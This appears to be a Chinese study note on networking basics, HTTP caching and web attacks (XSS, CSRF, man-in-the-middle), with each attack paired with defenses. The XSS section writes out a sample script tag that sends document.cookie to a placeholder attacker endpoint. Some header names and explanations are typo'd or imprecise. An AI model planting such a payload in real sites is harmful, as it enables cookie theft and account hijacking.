---
title: http
--- 
# 网络

## OSI 7 层参考模型

## TCP/IP 协议

1. 应用层(`HTTP`/`HTTPS`/`DNS`)
2. 传输层(`TCP`/`UDP`)
3. internet 层(`IP`)
4. 网络接口层(`物理接口`)

### TCP

**Transmisson Control Prorocol**

1. 连接建立
2. 可靠性传输
   特点： 三次握手四次挥手

### UDP

**User DataGram Protocol**

1. 非连接，不可靠传输方式
2. 效率高，速度快，适合音频和视频

### DNS

**Domain Name System**
域名解析系统
怎么查找域名：
DNS 域名解析采用的是递归查询的方式，过程，DNS 缓存>根域名服务器>根域名下一级

## HTTP 协议

Hypertext Transfer Protocol
超文本传输协议

## 缓存

数据库缓存、服务器端缓存（`nginx`、`CDN 缓存`）、浏览器缓存  
浏览器缓存由包含很多内容：`HTTP 缓存`、`indexDB`、`cookie`、`localstorage `等等

### HTTP 缓存

强缓存和协商缓存的区别就是，强缓存是不需要发请求到服务器的，而协商缓存是需要浏览器发送请求到服务器判断本地的缓存是否失效，若不失效则不请求服务器，反之请求服务器获取最新资源

### 强缓存

命中强缓存时，状态码为 200（Size 列标识为 from cache）的响应请求，利用 `Expire`s 和` Cache-Control` 控制强缓存。

1. Expires
   该值是响应头的字段，指定缓存到期的时间， `Expires=时间`，该时间为绝对时间，`Last-Modify` 结合使用
2. Cache-Control
   该值是响应头的字段，指定缓存到期的时间，`Cache-Control=max-age+时间`，该事件为相对时间

`Cache-Control` 优先级比 `Expires` 高
优点：  
服务器配置有限，降低服务器压力，1 台服务器能做到 10 台服务器的能力

> <- Expires: xxxx
> <- Cache-Control:max-age=600

### 协商缓存

命中协商缓存时，状态码为 304，利用 `Last-Modify/If-Modify-Since`

1. Last-Modify/If-Modify-Since
   第一次请求服务器，返回时会带上 `Last-Modify` 的响应头，标识着该资源最后修改时间，第二次请求时会带上 `If-Modify-since` 请求头，值为第一次响应的 `Last-Modify` 值，服务器会根据 `If-Modify-since` 判断是否命中缓存，**如果命中则不请求服务器，返回 304**，不返回 `Last-Modify`  
   第一次响应： `Last-Modify`  
   第二次请求： `If-Modify-since`
2. Etag/If-None-Match
   `Etag/If-None-Match` `返回的是一个校验码，Etag` 保证每个资源时唯一的，资源的变化都为导致 Etag 改变，服务器根据浏览器发送的 `If-None-Match` 判断是否命中缓存
   两者会优先验证 `Etag`,两种区别：

- 精度问题，第一种的精度时精确到秒，当资源的改变在秒级的时候，不太准确。所以由了 `Etag`
- 文件定期生成，当内容一样时，无法使用 `Last-Modify` 这一套
- 有可能存在服务器没有准确获取文件修改时间等，`Last-Modify` 也不能使用

> <- last-modifed: xxx
> -> if-modified-since: xxx
> <- etag: bbb
> -> if-noe-match: bbb

# web 安全

## 浏览器如何获取到 Cookie

- 利用接口响应的 Set-Cookie 字段  
  有哪些属性

1. domain
2. max-age、Express
3. httponly
4. name=value

## XSS (Cross-Site-Script) 跨站脚本攻击

恶意攻击者，将一些恶意代码插入到网页，当用户访问的时候自动执行这段代码，从而达到攻击者目的

1. 反射型
   特点： 一次性  
   用户点开带有恶意的 url（含有 script），浏览器将此段发送给服务端，服务端返回客户端，此时浏览器识别到可执行代码将其执行
2. 存储型
   特点：恶意代码存储到服务器  
   攻击者提交含有 script 标签的恶意代码表单到服务器，服务端将其保存，展示给其他用户时执行恶意代码

### 实现过程

1. 将 `<script scr="https://攻击者接口?cookie=document.cookie"> </script>`， 注册成用户名， 提交给服务端，服务端保存
2. 用户登录，如果查看到这个攻击者的账号信息相关，那么会执行恶意代码，将 cookie 拿到，发送到攻击者接口
3. 攻击者事先会收集各种接口，找到相关可以获取到用户的接口
4. 通过 cookie 获取到用户信息（手机号等）等

### 用途

1. 冒充身份
2. 刷点击（注入文章地址）
3. 弹广告（注入一段创建弹窗的代码）
4. 蠕虫病毒（冒充身份去发送邮件，联系人点开又会冒充去发送邮件....）

### 怎么防御

1. 输入过滤，对于特殊符号等不允许提交
2. httponly
3. 转义 HTML 比如： `< => &lt` 、 `> => &gt`

## CSRF (Cross-Site-Request-Forgery) 跨站点请求伪造

诱导受害者去到攻击者的网站，攻击者网站发起了相关请求，并且带上了受害者 cookie，从而可以做一些恶意的操作

前提： 浏览器没有严格执行同源政策，请求所在网站必须和请求的接口同源，就有可能发生 CSRF

### 实现过程

1. 受害者登录信任网站
2. 未关闭含有 cookie 的信任网站
3. 诱导受害者去攻击者网站（如果配合 XSS 此时可能会直接跳转，或者弹窗诱导到攻击者网站）
4. 在攻击者网站（用隐藏表单自动发送请求，img/src 自动 get 请求等骚操作...）发起信任网站相关接口，此时会携带用户的 cookie，冒充用户

### 用途

1. 冒充身份
2. 蠕虫病毒（冒充身份去发送邮件，联系人点开又会冒充去发送邮件....）

### 怎么防御

1. 用验证码，信任网站开启验证码，而攻击者网站没办法获取正确验证码
2. Referer ，表明请求的站点地址，但是有可能存在伪造 `Referer` 头
3. token，客户端接收服务端的 token，保存在隐藏区域（本地存储，隐藏的 html 元素，代码内存等），请求带上 token
4. 使用带有同源政策的浏览器，升级到默认开启严格模式版本

## 中间人攻击

是在数据传输时发生的攻击手段。截取 http 在传输时数据包，获取用户信息，篡改信息，篡改密钥
